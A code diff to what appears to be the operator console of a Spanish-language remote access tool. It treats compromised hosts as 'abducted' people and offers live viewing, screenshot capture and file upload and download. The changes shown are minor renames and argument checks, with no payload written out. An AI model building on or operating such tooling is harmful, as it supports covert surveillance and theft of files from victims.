@@ -233,7 +233,7 @@ class Server(Thread):
 
 	def VerAbducciones(self):
 		# -hold en xterm es para que la ventana quede estatica y no se cierre al terminar el programa
-		os.system('xterm -fg white -bg black -geometry 93x31+0+100 -title "Abduccion en vivo" -e python3 core/abducciones/pantalla.py &')
+		os.system('xterm -fg white -bg black -geometry 93x31+0+100 -title "Abduccion en vivo" -e python3 core/abducciones/live.py &')
 		return
 
 
@@ -476,7 +476,7 @@ class Control():
 			print (" [\033[1;32m+\033[0;39m] La captura se guardo en: screenshots/"+nombre_archivo)
 
 		else:
-			print (" [\033[1;31mx\033[0;39m] No se pudo capturar la imagen.")
+			print (" [\033[1;31mx\033[0;39m] No se pudo capturar la imagen debido a la incompatibilidad.")
 
 
 		return
@@ -506,8 +506,12 @@ class Control():
 
 			else:
 				subida = (subida.replace('subir','')).split()
-				if (len(subida)!=2):
+				if (len(subida)<2):
 					print (" [\033[1;31mx\033[0;39m] Faltan argumentos...")
+					return False
+
+				elif (len(subida)>2):
+					print (" [\033[1;31mx\033[0;39m] Hay demasiados argumentos...")
 					return False
 
 		else:
@@ -576,8 +580,13 @@ class Control():
 
 			else:
 				bajada = (bajada.replace('descargar','')).split()
-				if (len(bajada)!=2):
+				
+				if (len(bajada)<2):
 					print (" [\033[1;31mx\033[0;39m] Faltan argumentos...")
+					return False
+
+				elif (len(bajada)>2):
+					print (" [\033[1;31mx\033[0;39m] Hay demasiados argumentos...")
 					return False
 
 		else:
@@ -903,7 +912,7 @@ def abducciones_menu(servidor):
 
 	COMANDOS = {
 
-	"pantalla" : ["Screen","Permite ver el proceso de abduccion en modo real"],
+	"live" : ["live","Permite ver el proceso de abduccion en modo real"],
 	"abducidos" : ["Abducted","Lista todas las personas secuestradas"],
 
 	}
@@ -917,7 +926,7 @@ def abducciones_menu(servidor):
 
 	while (selector!='volver'):
 
-		if (selector=='pantalla'):
+		if (selector=='live'):
 			AbduccionEnVivo(servidor)
 			encabezados("abduccion")
 
